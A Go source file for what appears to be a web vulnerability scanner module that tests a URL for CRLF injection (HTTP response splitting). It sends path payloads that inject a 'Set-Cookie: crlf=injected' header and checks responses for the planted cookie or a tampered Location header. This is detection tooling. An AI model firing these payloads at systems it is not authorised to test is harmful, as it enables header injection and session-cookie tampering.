package core

import (
	"context"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

// CrlfInjectionTestingResult holds the result of the CrlfInjectionTesting module execution.
type CrlfInjectionTestingResult struct {
	Target string `json:"target"`
	Status string `json:"status"`
	Detail string `json:"detail,omitempty"`
}

// CrlfInjectionTesting executes the crlf_injection_testing security technique.
type CrlfInjectionTesting struct {
	BaseModule
	Target    string
	results   []CrlfInjectionTestingResult
	probeErrs []string
}

// NewCrlfInjectionTesting creates a new instance of CrlfInjectionTesting.
func NewCrlfInjectionTesting(target string) *CrlfInjectionTesting {
	// We want to test redirect/header injection without following redirects automatically
	client := NewHTTPClient(10 * time.Second)
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse // Don't follow redirects
	}

	return &CrlfInjectionTesting{
		BaseModule: BaseModule{
			Client:     client,
			MaxThreads: 5,
		},
		Target: EnsureHTTPPrefix(target),
	}
}

func (m *CrlfInjectionTesting) SetThreads(count int) {
	if count < 1 {
		count = 1
	}
	m.MaxThreads = count
}

// Literal CRLF sequences, not percent-encoded ones: Go re-escapes "%" in
// url.URL.Path on the wire, so "%0d%0a" previously arrived as "%250d%250a" and
// every payload was inert. Raw control characters are encoded exactly once by
// the net/url machinery (CRLF is legal inside a raw path per RFC 3986 as long
// as it is carried in RawPath; Go's URL.String emits it verbatim).
var crlfPayloads = []string{
	"\r\nSet-Cookie:crlf=injected",
	"\r\n Set-Cookie:crlf=injected",
	"#\r\nSet-Cookie:crlf=injected",
}

func (m *CrlfInjectionTesting) Execute(ctx context.Context) ([]CrlfInjectionTestingResult, error) {
	m.Mu.Lock()
	m.results = make([]CrlfInjectionTestingResult, 0)
	m.probeErrs = nil
	m.Mu.Unlock()

	parsedURL, err := url.Parse(m.Target)
	if err != nil {
		return m.results, err
	}

	jobs := make(chan string, len(crlfPayloads))
	for _, p := range crlfPayloads {
		jobs <- p
	}
	close(jobs)

	var wg sync.WaitGroup

	for i := 0; i < m.MaxThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for payload := range jobs {
				select {
				case <-ctx.Done():
					return
				default:
					m.testPayload(ctx, parsedURL, payload)
				}
			}
		}()
	}

	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		m.Mu.Lock()
		if len(m.results) == 0 && len(m.probeErrs) > 0 {
			m.results = append(m.results, CrlfInjectionTestingResult{
				Target: m.Target,
				Status: statusFromEvidence(EvidenceWeak, false),
				Detail: formatEvidenceDetail(EvidenceWeak, fmt.Sprintf("All probes failed; first error: %s", m.probeErrs[0])),
			})
		}
		m.Mu.Unlock()
		return m.results, nil
	case <-ctx.Done():
		<-done
		return m.results, ctx.Err()
	}
}

func (m *CrlfInjectionTesting) recordProbeError(err error) {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	if len(m.probeErrs) < 8 {
		m.probeErrs = append(m.probeErrs, err.Error())
	}
}

func (m *CrlfInjectionTesting) testPayload(ctx context.Context, u *url.URL, payload string) {
	// Typically CRLF works in paths or specific reflection params
	testURL := *u
	// Set both Path and RawPath so the literal CRLF survives URL.String()
	// without being re-escaped (RawPath must be a valid encoding of Path).
	testURL.RawPath = testURL.EscapedPath() + url.PathEscape(payload)
	testURL.Path = testURL.Path + payload

	req, err := http.NewRequestWithContext(ctx, "GET", testURL.String(), nil)
	if err != nil {
		return
	}

	resp, err := m.Client.Do(req)
	if err != nil {
		m.recordProbeError(fmt.Errorf("CRLF probe with path payload: %w", err))
		return
	}
	defer resp.Body.Close()

	if _, _, readErr := ReadBoundedBodyWithTruncation(resp.Body, MaxResponseBodyBytes); readErr != nil {
		m.recordProbeError(fmt.Errorf("failed to read CRLF probe response: %w", readErr))
		return
	}

	// The only reliable header-injection signal is a header the server
	// actually parsed: the injected Set-Cookie materializing as a cookie.
	if m.headerShowsInjection(resp, payload) {
		m.recordVulnerable(req, "CRLF Injection successful. Injected Set-Cookie header detected.")
		return
	}

	// Redirect responses carry the classic response-splitting signature only
	// when the injected marker reached the Location without the raw payload:
	// a Location that merely echoes the request path (raw or re-encoded) is
	// reflection, not header injection.
	if resp.StatusCode >= 300 && resp.StatusCode < 400 {
		if loc := resp.Header.Get("Location"); crlfLocationIsPayloadDerived(loc, payload) {
			m.recordVulnerable(req, fmt.Sprintf("CRLF Injection successful. Response splitting via Location header (status %d).", resp.StatusCode))
			return
		}
	}
}

// crlfLocationIsPayloadDerived reports whether a 3xx Location shows evidence
// that the CRLF payload was consumed as header structure: the injected marker
// appears in the redirect target while the payload itself does not. A
// Location that echoes the payload (verbatim or percent-encoded) is a server
// reflecting the request path and must not be flagged.
func crlfLocationIsPayloadDerived(loc, payload string) bool {
	if !strings.Contains(loc, "crlf=injected") {
		return false
	}
	for _, echo := range []string{
		payload,
		url.PathEscape(payload),
		url.QueryEscape(payload),
		strings.ToUpper(url.PathEscape(payload)),
	} {
		if strings.Contains(loc, echo) {
			return false
		}
	}
	return true
}

// headerShowsInjection reports whether the payload's injected Set-Cookie
// header was actually parsed by the server (the injected cookie materialized
// in resp.Cookies()). The previous loose scan — any header name containing
// "crlf" or value containing "crlf=injected" — false-positived on servers
// that echo the request path into a response header, so it was dropped.
func (m *CrlfInjectionTesting) headerShowsInjection(resp *http.Response, payload string) bool {
	if !strings.Contains(payload, "Set-Cookie") {
		return false
	}
	for _, cookie := range resp.Cookies() {
		if cookie.Name == "crlf" && cookie.Value == "injected" {
			return true
		}
	}
	return false
}

func (m *CrlfInjectionTesting) recordVulnerable(req *http.Request, detail string) {
	m.Mu.Lock()
	defer m.Mu.Unlock()
	m.RecordPoC(req, nil, detail)
	m.results = append(m.results, CrlfInjectionTestingResult{
		Target: m.Target,
		Status: statusFromEvidence(EvidenceConfirmed, false),
		Detail: formatEvidenceDetail(EvidenceConfirmed, detail),
	})
}

func init() {
	RegisterModule("crlf_injection_testing", func(payload map[string]any, onLog func(string)) (ExecutableModule, error) {

		target := PayloadString(payload, "url", "")
		onLog(fmt.Sprintf("Starting CrlfInjectionTesting on: %s", target))

		tester := NewCrlfInjectionTesting(target)
		tester.SetThreads(PayloadInt(payload, "threads", 5))

		return ModuleWrapper{
			Module: tester,
			ExecuteFunc: func(ctx context.Context) (any, error) {
				return tester.Execute(ctx)
			},
		}, nil
	})
}
